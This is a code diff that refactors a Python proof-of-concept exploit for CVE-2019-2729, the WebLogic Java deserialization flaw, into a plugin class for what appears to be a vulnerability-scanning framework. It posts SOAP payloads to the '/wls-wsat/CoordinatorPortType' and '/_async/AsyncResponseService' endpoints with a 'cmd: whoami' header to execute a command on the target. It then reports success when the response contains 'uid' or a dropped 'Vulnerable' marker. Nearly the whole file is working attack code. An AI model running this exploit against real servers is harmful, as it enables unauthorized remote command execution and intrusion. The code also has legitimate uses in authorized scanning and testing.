@@ -1,29 +1,14 @@
 #!/usr/bin/env python3
 # _*_ coding:utf-8 _*_
-'''
- ____       _     _     _ _   __  __           _
-|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
-| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
-|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
-|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\
+# CVE-2019-2729
 
-'''
-import logging
-import sys
 import time
+from urllib.parse import urljoin
 
-import requests
+from poc import universe, Star, target_type
+from utils import http
 
-logging.basicConfig(filename='Weblogic.log',
-                    format='%(asctime)s %(message)s',
-                    filemode="w", level=logging.INFO)
-
-VUL=['CVE-2019-2729']
-headers = {'user-agent': 'ceshi/0.0.1', 'content-type': 'text/xml', 'cmd': 'whoami'}
-
-
-path1 = '/wls-wsat/CoordinatorPortType'
-path2 = '/_async/AsyncResponseService'
+headers = {'Content-Type': 'text/xml', 'cmd': 'whoami'}
 
 payload1 = '''
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
@@ -3546,23 +3531,27 @@ payload2 = '''
 </soapenv:Envelope>
 '''
 
+path1 = '/wls-wsat/CoordinatorPortType'
+path2 = '/_async/AsyncResponseService'
 
-def run(ip,port,index):
-    r1 = requests.post('http://' + str(ip) + ':' + str(port) + path1, headers=headers, data=payload1, timeout=3)
-    time.sleep(1)
-    r2 = requests.post('http://' + str(ip) + ':' + str(port) + path2, headers=headers, data=payload2, timeout=3)
-    time.sleep(1)
-    r3 = requests.get('http://' + str(ip) + ':' + str(port) + '/_async/favicon.ico')
-    if ((r1.status_code == 200) and 'uid' in r1.text) or ((r2.status_code == 202) and 'Vulnerable' in r3.text):
-        logging.info('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        logging.info('[+]Your current permission is:  {}'.format(r1.text.replace('whoami : \r\n', '')))
-        print('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        print('[+]Your current permission is:  {}'.format(r1.text.replace('whoami : \r\n', '')))
-    else:
-        logging.info('[-]Target weblogic not detected {}'.format(VUL[index]))
-        print('[-]Target weblogic not detected {}'.format(VUL[index]))
 
-if __name__ == '__main__':
-    dip = sys.argv[1]
-    dport = int(sys.argv[2])
-    run(dip,dport,0)
+@universe.groups()
+class CVE_2019_2729(Star):
+    info = {
+        'NAME': '',
+        'CVE': 'CVE-2019-2729',
+        'TAG': []
+    }
+    type = target_type.VULNERABILITY
+
+    def light_up(self, dip, dport, *args, **kwargs) -> (bool, dict):
+        result1, data = http(urljoin(f'http://{dip}:{dport}', path1), 'POST', headers, data=payload1, timeout=3)
+        time.sleep(1)
+        result2, data = http(urljoin(f'http://{dip}:{dport}', path2), 'POST', headers, data=payload2, timeout=3)
+        time.sleep(1)
+        result_ico, data = http(urljoin(f'http://{dip}:{dport}', '/_async/favicon.ico'))
+        if (result1 and result1.status_code == 200 and 'uid' in result1.text) or (
+                result2 and result2.status_code == 202 and result_ico and 'Vulnerable' in result_ico.text):
+            return True, {'msg': 'finish.'}
+        else:
+            return False, {'msg': 'finish.'}
